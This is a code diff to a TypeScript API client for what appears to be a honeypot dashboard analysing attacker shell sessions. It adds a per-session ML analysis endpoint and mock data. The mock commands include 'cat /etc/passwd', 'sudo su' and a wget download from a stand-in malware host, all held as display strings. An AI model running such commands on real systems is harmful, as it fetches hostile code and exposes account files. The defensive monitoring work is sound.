@@ -1,4 +1,3 @@
-
 import { toast } from "@/hooks/use-toast";
 
 // Base URL for the API
@@ -37,6 +36,15 @@ export interface MLAnalysisResponse {
   command_categories: Record<string, number>;
   command_trend: Array<{ date: string; count: number }>;
   top_commands: Array<{ command: string; count: number }>;
+}
+
+export interface SessionMLAnalysisResponse {
+  command_categories: Record<string, number>;
+  commands: Array<{ 
+    command: string; 
+    ml_output: string; 
+    timestamp: string;
+  }>;
 }
 
 // Utility function for API requests
@@ -90,6 +98,10 @@ export async function fetchMLAnalysis(): Promise<MLAnalysisResponse> {
   return apiRequest<MLAnalysisResponse>("/ml/analysis");
 }
 
+export async function fetchSessionML(sessionId: string): Promise<SessionMLAnalysisResponse> {
+  return apiRequest<SessionMLAnalysisResponse>(`/sessions/${sessionId}/ml`);
+}
+
 export async function fetchCommandAnalysis(): Promise<any> {
   return apiRequest<any>("/ml/commands");
 }
@@ -100,7 +112,6 @@ export async function fetchAttackerProfiles(): Promise<any> {
 
 // Mock API functions for development (will connect to real backend when ready)
 export async function mockFetchSessions(): Promise<SessionsResponse> {
-  // This simulates API response for development
   return {
     sessions: Array.from({ length: 15 }, (_, i) => ({
       session_id: `session_${i + 1}`,
@@ -150,7 +161,25 @@ export async function mockFetchMLAnalysis(): Promise<MLAnalysisResponse> {
   };
 }
 
+// Mock function for session-specific ML analysis
+export async function mockFetchSessionML(sessionId: string): Promise<SessionMLAnalysisResponse> {
+  return {
+    command_categories: {
+      "System Info": Math.floor(Math.random() * 20) + 5,
+      "Navigation": Math.floor(Math.random() * 30) + 10,
+      "Network Scan": Math.floor(Math.random() * 15) + 3,
+      "User Enumeration": Math.floor(Math.random() * 25) + 8,
+    },
+    commands: Array.from({ length: 15 }, (_, i) => ({
+      command: ["ls -la", "cat /etc/passwd", "uname -a", "wget http://malware.com/payload", "cd /tmp", "sudo su"][i % 6],
+      ml_output: ["System Info", "Navigation", "Network Scan", "User Enumeration"][i % 4],
+      timestamp: new Date(Date.now() - i * 60000).toISOString(),
+    })),
+  };
+}
+
 // Use these functions during development until backend is connected
 export const fetchSessionsData = import.meta.env.DEV ? mockFetchSessions : fetchSessions;
 export const fetchStatsData = import.meta.env.DEV ? mockFetchStats : fetchStats;
 export const fetchMLAnalysisData = import.meta.env.DEV ? mockFetchMLAnalysis : fetchMLAnalysis;
+export const fetchSessionMLData = import.meta.env.DEV ? mockFetchSessionML : fetchSessionML;
